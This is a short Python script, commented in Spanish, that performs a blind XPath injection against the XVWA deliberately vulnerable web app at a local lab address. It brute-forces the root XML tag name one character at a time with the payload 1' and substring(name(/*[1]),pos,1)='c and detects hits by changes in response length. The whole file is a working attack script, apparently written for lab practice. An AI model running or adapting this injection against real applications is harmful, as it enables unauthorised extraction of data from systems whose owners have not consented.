# la idea es descubrir por inyeccion xpath el nombre de la tag del xml
# el payload -> 1' and substring(name(/*[1]), 1, 1) = 'a
# donde el segundo 1 es donde se va a iterar por la poosicion y donde esta la a es donde se va a iterar por el alfabeto
# asi descubrimos el nombre de la tag del xml
from pwn import *

import requests
import time
import sys
import string
import signal

# vars
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"    # dhcp te proporcionara otra ip por lo que deberas ajustarla
caracteres = string.ascii_letters

# print(caracteres)

def def_handler(signal, frame):
    print("\n[+] Interrumpido por el usuario - Saliendo...\n")
    sys.exit(1)


def solicitar_longitud():
    return input("[+] Introducir la longitud de la etiqueta: ")

def main():

    tag_lenth= solicitar_longitud()
    respuesta=''

    p1= log.progress("Ataque de inyeccion xpath")
    p1.status("Iniciando el ataque")
    time.sleep(2)

    p2= log.progress("Respuesta")

    # recorremos la longitud de la tag qeu en estae caso es 7
    for pos in range(1, int(tag_lenth)+1):

        # recorrido de caracateres
        for caracter in caracteres:

            # para saber la longitud puedes probar reemplazar substring por string-length() > o = a alguna longitud
            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s" % (pos, caracter),
                'submit': ''
            }

            # hacemos la peticion
            r= requests.post(main_url, data=post_data)

            data_response= len(r.text)        # para saber la longitud de la respuesta
            if data_response != 8681:       # 8681 es la longitud de la respuesta cuando no es correcta
                # print(data_response)
                respuesta+= caracter
                # print(f"[+] Respuesta: {respuesta}")
                p2.status(respuesta)

                break


    p1.success("Ataque de fuerza bruta finalizado!!")
    p2.success(f"Respuesta: {respuesta}")


signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":
    main()
